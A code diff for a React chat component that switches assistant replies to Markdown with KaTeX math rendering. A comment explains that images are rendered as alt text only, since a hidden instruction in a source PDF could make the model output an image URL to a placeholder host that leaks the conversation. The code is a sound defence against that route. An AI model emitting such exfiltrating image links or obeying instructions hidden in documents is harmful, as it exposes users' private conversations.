@@ -1,29 +1,32 @@
 import { useState } from 'react';
 import { Text, UnstyledButton } from '@mantine/core';
 import { IconChevronDown, IconChevronUp, IconSparkles } from '@tabler/icons-react';
+import ReactMarkdown from 'react-markdown';
+import remarkGfm from 'remark-gfm';
+import remarkMath from 'remark-math';
+import rehypeKatex from 'rehype-katex';
+import 'katex/dist/katex.min.css';
 import styles from '../../styles/Chats/Chats.module.css';
+import { prepararMarkdown } from './prepararMarkdown';
+
+const componentes = {
+    a({ href = '', children }) {
+        if (href.startsWith('#cite-')) {
+            return <span className={styles.cite}>{children}</span>;
+        }
+        return <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>;
+    },
+    // a resposta pode vir de um PDF com instrução escondida: uma imagem
+    // ![](https://site/?q=...) seria buscada sozinha e vazaria a conversa
+    img({ alt }) {
+        return alt || null;
+    },
+};
 
 /**
- * Formata o texto da resposta: **negrito** e citações [n] viram elementos;
- * o resto fica como texto puro (sem HTML vindo do modelo).
- */
-export function renderInline(text) {
-    return String(text ?? '')
-        .split(/(\*\*[^*\n]+\*\*|\[\d+\])/g)
-        .map((part, i) => {
-            if (part.length > 4 && part.startsWith('**') && part.endsWith('**')) {
-                return <strong key={i}>{part.slice(2, -2)}</strong>;
-            }
-            if (/^\[\d+\]$/.test(part)) {
-                return <span key={i} className={styles.cite}>{part.slice(1, -1)}</span>;
-            }
-            return part;
-        });
-}
-
-/**
- * Um balão da conversa. Respostas do assistente mostram as fontes (trechos
- * dos PDFs) num bloco que abre ao tocar, para funcionar também no celular.
+ * Um balão da conversa. Respostas do assistente vêm em Markdown com LaTeX
+ * (KaTeX) e mostram as fontes (trechos dos PDFs) num bloco que abre ao tocar,
+ * para funcionar também no celular. HTML vindo do modelo não é interpretado.
  *
  * @param {Object} props
  * @param {'user'|'assistant'} props.papel
@@ -47,7 +50,15 @@ export default function ChatMessage({ papel, msg, sources = [] }) {
         <div className={styles.rowAssistant}>
             <span className={styles.avatar} aria-hidden="true"><IconSparkles size={16} /></span>
             <div className={styles.bubbleAssistant}>
-                <Text className={styles.bubbleText}>{renderInline(msg)}</Text>
+                <div className={styles.markdown}>
+                    <ReactMarkdown
+                        remarkPlugins={[remarkGfm, remarkMath]}
+                        rehypePlugins={[[rehypeKatex, { maxSize: 10 }]]}
+                        components={componentes}
+                    >
+                        {prepararMarkdown(msg)}
+                    </ReactMarkdown>
+                </div>
 
                 {sources.length > 0 && (
                     <>
